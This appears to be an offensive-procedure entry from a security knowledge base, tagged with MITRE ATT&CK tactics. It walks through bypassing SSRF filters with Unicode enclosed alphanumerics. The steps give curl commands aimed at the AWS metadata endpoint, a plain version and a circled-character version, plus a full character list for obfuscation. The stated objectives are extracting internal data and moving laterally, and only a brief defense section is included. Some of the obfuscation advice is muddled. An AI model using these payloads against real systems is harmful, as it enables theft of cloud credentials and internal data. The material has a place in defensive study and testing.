---
id: 3c0b1141-58b3-46ff-a737-2a060e4550c3
name: Bypass-SSRF-Filters-Using-Enclosed-Alphanumerics
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:37.562230+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques: []
tags:
  - '[[tags/Bypassing filters]]'
  - '[[tags/Bypass using enclosed alphanumerics]]'
  - '[[tags/Server-Side Request Forgery]]'
  - ssrf
  - obfuscation
  - web-vulnerability
commands:
  - '[[commands/curl-send-obfuscated-ssrf]]'
platforms:
  - Web
tools: []
validated: true
---

# Bypass-SSRF-Filters-Using-Enclosed-Alphanumerics

## Summary

This procedure demonstrates how to bypass Server-Side Request Forgery (SSRF) filters by enclosing the target URL within Unicode enclosed alphanumeric characters. These characters obfuscate the malicious URL, evading simple keyword-based or pattern-matching filters that block direct SSRF attempts. Once bypassed, the attacker can force the server to make unauthorized requests to internal resources, such as metadata endpoints or internal APIs, enabling data exfiltration or further lateral movement.

## Description

Server-Side Request Forgery (SSRF) vulnerabilities allow attackers to induce a server to make requests to arbitrary locations, often internal systems not directly accessible from the internet. Many applications implement basic filters to block common SSRF payloads like 'http://localhost' or 'http://127.0.0.1'. This technique exploits weaknesses in those filters by wrapping the target URL in Unicode enclosed alphanumerics (e.g., circled letters and numbers like ⓐ, ①), which appear as harmless alphanumeric strings but can be used to construct or decode into a valid URL. This evasion works because filters may only scan for exact matches without handling Unicode normalization or decoding. The procedure is applicable in web applications with user-controlled URL inputs, such as image loaders, webhooks, or API endpoints that fetch external resources. Successful execution can lead to accessing internal services like AWS metadata (169.254.169.254) or private network resources.

## Requirements

1. Access to a web application with a confirmed SSRF vulnerability where user input controls server-side requests (e.g., via a URL parameter in an API endpoint).
2. Knowledge of the target internal URL or resource (e.g., http://localhost/admin or http://169.254.169.254/latest/meta-data/).
3. A tool like curl or Burp Suite for crafting and sending HTTP requests.
4. Basic understanding of URL encoding and Unicode characters to avoid breaking the payload.

## Defense

- Implement comprehensive input validation that normalizes and decodes Unicode characters before processing URLs.
- Use whitelisting for allowed domains instead of blacklisting prohibited patterns.
- Deploy Web Application Firewalls (WAFs) with rules for detecting obfuscated SSRF payloads, including Unicode variants.
- Monitor server logs for unexpected internal requests and network traffic to private IP ranges (e.g., 169.254.169.254, 127.0.0.1).

## Objectives

1. Bypass SSRF input filters to force the server to request internal or unauthorized resources.
2. Access sensitive internal data, such as cloud metadata or private APIs.
3. Enable further attacks like data exfiltration or lateral movement within the network.
4. Validate the bypass without triggering application errors.

## Instructions

### Step 1: Identify the SSRF Endpoint and Test Basic Filter

**Context**: Confirm the SSRF vulnerability and understand the filter's behavior by testing a direct payload. This establishes a baseline for what gets blocked.

Use [[commands/curl-send-obfuscated-ssrf]] to send a basic SSRF test request:

```bash
curl -X POST "http://vulnerable-app.com/api/fetch?url=http://169.254.169.254/latest/meta-data/" -d "data=fetch"
```

> This command attempts to fetch AWS instance metadata directly. If blocked, the response will show an error like 'Invalid URL' or 'Blocked domain'. Expected output on failure: HTTP 400/403 with filter rejection message. On success (rare without bypass), the response includes metadata like instance ID.

### Step 2: Craft Obfuscated URL Using Enclosed Alphanumerics

**Context**: Select Unicode enclosed alphanumeric characters to wrap the target URL. These characters (e.g., ①②③ for numbers, ⓐⓑⓒ for letters) create an alphanumeric shell that may fool regex-based filters looking for 'http://' patterns without Unicode awareness.

Construct the payload manually or via a script. Example obfuscated URL for AWS metadata:

`http://example.com/api/fetch?url=ⓗⓣⓣⓟ://①⑥⑨.②⑤④.①⑥⑨.②⑤④/ⓛⓐⓣⓔⓢⓣ/ⓜⓔⓣⓐ-ⓓⓐⓣⓐ/`

Reference character list for obfuscation (copy and adapt as needed):

① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿

> Replace parts of the URL with these characters (e.g., map 'h' to 'ⓗ', '1' to '①'). Test incrementally: start with simple enclosure like `①http://localhost②`, then build to full obfuscation. Expected output: No immediate error; proceed to Step 3.

Decision Point: If the app URL-decodes the input, the server may interpret the enclosed characters as part of the URL path or query. If it fails, try double-encoding or alternative Unicode ranges.

### Step 3: Send the Obfuscated SSRF Request

**Context**: Submit the crafted payload to the SSRF endpoint to verify bypass and retrieve the target resource.

Use [[commands/curl-send-obfuscated-ssrf]] with the obfuscated URL:

```bash
curl -X POST "http://vulnerable-app.com/api/fetch?url=ⓗⓣⓣⓟ://①⑥⑨.②⑤④.①⑥⑨.②⑤④/ⓛⓐⓣⓔⓢⓣ/ⓜⓔⓣⓐ-ⓓⓐⓣⓐ/" -d "data=fetch" -v
```

> The `-v` flag enables verbose output to inspect headers and response. Expected output on success: The application's response echoes or processes the internal resource, e.g., JSON with AWS metadata like {"instance-id": "i-1234567890abcdef0"}. On failure: Filter block or garbled response.

### Step 4: Verify and Extract Data

**Context**: Confirm the bypass worked by checking for sensitive data in the response and iterating if needed.

Parse the response for indicators of internal access (e.g., grep for known internal strings). If partial success, refine the obfuscation (e.g., use fewer characters or different enclosure).

> Expected output: Readable data from the internal endpoint. Success criteria: Access to restricted resource without direct URL matching the filter.
